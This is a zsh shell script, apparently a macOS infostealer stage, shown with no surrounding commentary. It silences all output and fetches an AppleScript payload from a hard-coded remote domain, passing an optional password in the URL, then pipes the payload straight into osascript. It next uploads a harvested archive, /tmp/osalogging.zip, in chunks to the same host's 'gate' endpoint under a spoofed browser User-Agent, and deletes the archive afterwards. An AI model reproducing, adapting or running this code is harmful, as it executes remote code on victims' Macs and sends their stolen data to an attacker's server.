#!/bin/zsh
daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    local domain="fusser-api.com"
    local token="d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58"
    local api_key="5190ef1733183a0dc63fb623357f56d6"
    local file="/tmp/osalogging.zip"
    if [ $# -gt 0 ]; then
        curl -k -s --max-time 30 \
            -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
            -H "api-key: $api_key" \
            "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    else
        curl -k -s --max-time 30 \
            -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
            -H "api-key: $api_key" \
            "http://$domain/dynamic?txd=$token" | osascript
    fi
    if [ $? -ne 0 ]; then
        exit 1
    fi
    if [[ ! -f "$file" || ! -s "$file" ]]; then
        return 1
    fi
    local CHUNK_SIZE=$((10 * 1024 * 1024))
    local MAX_RETRIES=8
    local upload_id=$(date +%s)-$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)
    local total_size
    total_size=$(stat -f %z "$file" 2>/dev/null || stat -c %s "$file")
    if [[ -z "$total_size" || "$total_size" -eq 0 ]]; then
        return 1
    fi
    local total_chunks=$(( (total_size + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    local i=0
    while (( i < total_chunks )); do
        local offset=$((i * CHUNK_SIZE))
        local chunk_size=$CHUNK_SIZE
        (( offset + chunk_size > total_size )) && chunk_size=$((total_size - offset))
        local success=0
        local attempt=1
        while (( attempt <= MAX_RETRIES && success == 0 )); do
            http_code=$(dd if="$file" bs=1 skip=$offset count=$chunk_size 2>/dev/null | \
                curl -k -s -X PUT \
                --data-binary @- \
                -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
                -H "api-key: $api_key" \
                --max-time 180 \
                -o /dev/null \
                -w "%{http_code}" \
                "http://$domain/gate?buildtxd=$token&upload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks" 2>/dev/null)
            curl_status=$?
            if [[ $curl_status -eq 0 && $http_code -ge 200 && $http_code -lt 300 ]]; then
                success=1
            else
                ((attempt++))
                sleep $((3 + attempt * 2))
            fi
        done
        if (( success == 0 )); then
            return 1
        fi
        ((i++))
    done
    rm -f "$file"
    return 0
}
if daemon_function "$@" & then
    exit 0
else
    exit 1
fi